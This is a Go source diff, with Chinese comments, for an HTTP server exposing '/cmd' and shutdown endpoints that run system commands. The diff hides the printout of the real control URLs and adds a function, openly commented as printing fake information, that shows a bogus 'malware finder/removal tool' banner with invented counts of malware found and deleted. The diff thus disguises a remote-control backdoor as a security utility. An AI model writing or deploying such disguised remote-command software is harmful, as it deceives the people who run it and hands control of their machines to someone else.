@@ -3,7 +3,6 @@ package main
 import (
 	"flag"
 	"fmt"
-	"net"
 	"net/http"
 	"os/exec"
 )
@@ -23,28 +22,15 @@ func main() {
 	mux.HandleFunc("/cmd", cmd)
 	// 解析启动参数
 	flag.Parse()
+	// 打印假的信息
+	printHelp(*port, *pwd)
 	// 打印服务请求地址
-	printAddress(*port, *pwd)
+	// printAddress(*port, *pwd)
 	// 设置监听的端口
 	err := http.ListenAndServe(":"+*port, mux)
 	if err != nil {
-		fmt.Println("服务启动失败，请检查端口是否被占用！")
+		fmt.Println("服务启动失败，请检查端口是否被占用")
 	}
-}
-
-func getMacAddr() ([]string, error) {
-	ifas, err := net.Interfaces()
-	if err != nil {
-		return nil, err
-	}
-	var as []string
-	for _, ifa := range ifas {
-		a := ifa.HardwareAddr.String()
-		if a != "" {
-			as = append(as, a)
-		}
-	}
-	return as, nil
 }
 
 // 该方法用于关机
@@ -90,6 +76,7 @@ func cmd(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte("成功"))
 }
 
+/*
 // 打印服务请求地址
 func printAddress(port string, pwd string) {
 	fmt.Println("-------------------------------------------------------")
@@ -97,4 +84,13 @@ func printAddress(port string, pwd string) {
 	fmt.Println("立即关机：http://localhost:" + port + "/shutdown?pwd=" + pwd)
 	fmt.Println("-------------------------------------------------------")
 	fmt.Println("服务正在运行......")
+}
+*/
+
+func printHelp(port string, pwd string) {
+	fmt.Println("---------------------恶意软件查找/删除工具---------------------")
+	fmt.Println("已发现 " + port + " 个恶意软件")
+	fmt.Println("已删除 " + port + " / 共 " + pwd + " 个")
+	fmt.Println("---------------------恶意软件查找/删除工具---------------------")
+	fmt.Println("正在清理...")
 }
